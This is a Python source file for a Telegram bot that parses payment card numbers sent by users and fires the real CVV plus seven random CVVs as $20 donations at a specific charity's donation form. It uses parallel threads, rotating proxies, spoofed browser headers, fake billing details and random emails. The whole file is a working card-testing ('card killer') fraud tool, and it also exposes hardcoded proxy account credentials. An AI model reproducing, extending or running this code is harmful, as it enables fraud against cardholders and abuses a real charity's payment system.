import requests
import re
import random
import time
import string
import logging
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple
from bs4 import BeautifulSoup, SoupStrainer
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

# --- existing logging / proxies / user-agents (unchanged) ---
# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('killer.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)
proxy_credentials = [
    'tnapkbnn-rotate:8vsviipgym5g',
    # Add more Webshare proxy usernames if available
]
proxy_base = 'p.webshare.io:80'
proxies_list = [
    {
        'http': f'http://{cred}@{proxy_base}/',
        'https': f'http://{cred}@{proxy_base}/'
    } for cred in proxy_credentials
]

# Random User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
]

def get_random_user_agent() -> str:
    """Returns a random User-Agent."""
    return random.choice(USER_AGENTS)

def generate_random_email() -> str:
    """Generate a random email."""
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(('gmail.com', 'yahoo.com', 'outlook.com'))
    return f"{username}@{domain}"

def get_fresh_cookies(proxy: dict) -> dict:
    """Fetches fresh cookies from the donation page."""
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'user-agent': get_random_user_agent(),
        }
        response = requests.get(
            'https://aasr-indy.org/philanthropy/donate/',
            headers=headers,
            proxies=proxy,
            timeout=5
        )
        cookies = response.cookies.get_dict()
        return cookies  # <-- fixed: return cookies on success
    except Exception as e:
        logger.error(f"Failed to fetch cookies: {str(e)}")
        return {}

# ------------------ NEW: Flexible card input parser ------------------
def parse_card_input(raw: str) -> str:
    """
    Try to extract card number, expiry month/year and cvv from arbitrary input.
    Returns normalized string: cc|mm|yy|cvv (yy = two digits).
    Raises ValueError if parsing fails.
    Examples supported:
      - 4111111111111111|12|25|123
      - 4111 1111 1111 1111 12/25 123
      - multiline with labels:
          4701320081651941
          Expired :
          06/29
          Cvv :
          091
    """
    text = raw.strip()
    if '|' in text and len(text.split('|')) == 4:
        # Already normalized-ish — validate and return
        cc, mm, yy, cvv = [p.strip() for p in text.split('|')]
        if re.fullmatch(r'\d{13,19}', cc) and re.fullmatch(r'\d{1,2}', mm) and re.fullmatch(r'\d{2,4}', yy) and re.fullmatch(r'\d{3,4}', cvv):
            # Normalize year to two digits
            yy2 = yy[-2:]
            mm2 = mm.zfill(2)
            return f"{cc}|{mm2}|{yy2}|{cvv}"
        else:
            raise ValueError("Invalid pipe-separated card format")

    lowered = text.lower()
    # Remove common label words to make extraction simpler
    sanitized = re.sub(r'(card number|card|number|pan|expired|exp|expiry|expiry date|exp:|cvv:|cvc:|cvn:|cvc code|security code|cvv code|mm\/yy)', ' ', lowered, flags=re.I)
    # Replace common separators with spaces
    sanitized = re.sub(r'[\r\n\t,;]+', ' ', sanitized)
    # Keep slashes for explicit expiry detection
    sanitized = re.sub(r'[^\d/ ]', ' ', sanitized)

    # 1) Find card number: first long digit sequence 13-19
    card_match = re.search(r'\b(\d{13,19})\b', sanitized)
    if not card_match:
        # maybe number spaced: combine digits sequences to find 16 digits across spaces
        all_digits = re.findall(r'\d+', sanitized)
        joined = ''.join(all_digits)
        mm = None
        if re.search(r'\d{13,19}', joined):
            cc = re.search(r'(\d{13,19})', joined).group(1)
        else:
            raise ValueError("Card number not found")
    else:
        cc = card_match.group(1)

    # 2) Find expiry: prefer mm/yy or mm/yyyy pattern
    expiry_match = re.search(r'\b(0[1-9]|1[0-2])\s*[\/\-]\s*(\d{2,4})\b', sanitized)
    mm = yy = None
    if expiry_match:
        mm_raw = expiry_match.group(1)
        yy_raw = expiry_match.group(2)
        mm = mm_raw.zfill(2)
        yy = yy_raw[-2:]
    else:
        # fallback: look for two adjacent small numbers where first is month (1-12) and second is 2 or 4 digit year
        tokens = re.findall(r'\d+', sanitized)
        # Remove the found card number digits from tokens to avoid confusion
        tokens = [t for t in tokens if t not in [cc]]
        # Try to find pair
        found = False
        for i in range(len(tokens)-1):
            a, b = tokens[i], tokens[i+1]
            if 1 <= int(a) <= 12 and (len(b) == 2 or len(b) == 4):
                mm = str(int(a)).zfill(2)
                yy = b[-2:]
                found = True
                break
        if not found:
            # no expiry found
            mm = None
            yy = None

    # 3) Find CVV: look for 3-4 digit sequences that are not the card and not the year/month tokens
    # Create a blacklist of values to ignore
    blacklist = {cc}
    if mm: blacklist.add(str(int(mm)))  # prevent "06" matching if month present
    if yy: blacklist.add(str(int(yy)))  # prevent "29" matching if year present

    cvv = None
    # Search for labelled cvv first
    cvv_label_match = re.search(r'(?:cvv|cvc|cvn|security code|cvv code)[^\d]{0,6}(\d{3,4})', lowered, flags=re.I)
    if cvv_label_match:
        cvv = cvv_label_match.group(1)
    else:
        # otherwise search remaining digit groups
        digit_groups = re.findall(r'\b(\d{3,4})\b', sanitized)
        for dg in digit_groups:
            if dg not in blacklist:
                cvv = dg
                break

    # final validation
    if not cc:
        raise ValueError("Card number not parsed")
    if not mm or not yy:
        # If expiry missing, raise — your flow expects expiry
        raise ValueError("Expiry month/year not parsed")
    if not cvv:
        raise ValueError("CVV not parsed")

    return f"{cc}|{mm.zfill(2)}|{yy}|{cvv}"

# ------------------ End parser ------------------

def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
    """Processes a single CVV with a fresh session."""
    cc, mm, yy, _ = card_info.split('|')
    
    # Create fresh session
    with requests.Session() as session:
        # Get fresh cookies
        cookies = get_fresh_cookies(proxy)
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://aasr-indy.org',
            'priority': 'u=0, i',
            'referer': 'https://aasr-indy.org/philanthropy/donate/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': get_random_user_agent(),
        }

        data = {
            'amount': '20',
            'direct_to': 'Cathedral Foundation',
            'type': 'General',
            'memory_of': 'Elizabeth Queen',
            'credit_card': 'Visa',
            'credit_card_number': cc,
            'expiration_month': mm,
            'expiration_year': f"20{yy}",
            'cvv': cvv,
            'billing_first_name': 'Mohammed',
            'billing_last_name': 'Nehal',
            'billing_address': 'New York',
            'billing_city': 'New York',
            'billing_state': 'New York',
            'billing_postal_code': '10040',
            'billing_country': 'United States',
            'billing_telephone': '07975102052',
            'billing_email': generate_random_email(),
            'submit': '1',
            'debug': '1',
        }

        try:
            response = session.post(
                'https://aasr-indy.org/philanthropy/donate/',
                params='',
                headers=headers,
                data=data,
                cookies=cookies,
                proxies=proxy,
                timeout=5
            )
            match = re.search(r'<p\s+class="attention">\s*(.*?)\s*</p>', response.text)
            msg = match.group(1) if match else "No attention message found"
            logger.info(f"CVV {cvv}: {msg}")
            return f"{cvv} - {msg}"
        except Exception as e:
            logger.error(f"Error for CVV {cvv}: {str(e)}")
            return f"{cvv} - Error: {str(e)}"

async def ded(client: TelegramClient, event: events.NewMessage.Event, card_info: str):
    """Process card and send results to Telegram."""
    user_id = event.sender_id
    chat = await event.get_chat()

    # Try to parse/normalize card input in multiple formats
    try:
        normalized_card = parse_card_input(card_info)
    except ValueError as e:
        await event.reply(f"❌ **Error**: Could not parse card input. {str(e)}\n\nUse format: cc|mm|yy|cvv or give card, expiry (mm/yy) and cvv anywhere in the message.")
        return

    try:
        cc, mm, yy, real_cvv = normalized_card.split('|')
        if not (cc.isdigit() and mm.isdigit() and yy.isdigit() and real_cvv.isdigit()):
            raise ValueError("Invalid card format after parsing")
    except ValueError:
        await event.reply("❌ **Error**: Invalid format. Use cc|mm|yy|cvv (e.g., 4111111111111111|12|25|123)")
        return

    processing_msg = await event.reply("𝑲𝒊𝒍𝒍𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒄𝒂𝒓𝒅... 💀")

    start_time = time.time()
    cvvs = [real_cvv] + [f"{random.randint(0, 999):03d}" for _ in range(7)]

    with ThreadPoolExecutor(max_workers=8) as executor:
        proxy_cycle = proxies_list * (len(cvvs) // len(proxies_list) + 1)
        results = list(executor.map(lambda c, p: process_cvv(normalized_card, c, p), cvvs, proxy_cycle[:len(cvvs)]))

    end_time = time.time()
    total_time = end_time - start_time
    result_message = "☠️ 𝑲𝒊𝒍𝒍𝒆𝒅 𝒔𝒖𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚\n"
    
    # Append each CVV result to the result_message
    for result in results:
        result_message += f"{result}\n"

    result_message += f"\n⏱ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: {total_time:.2f} 𝘴𝘦𝘤𝘰𝘯𝘥𝘴\n"

    await processing_msg.edit(result_message)
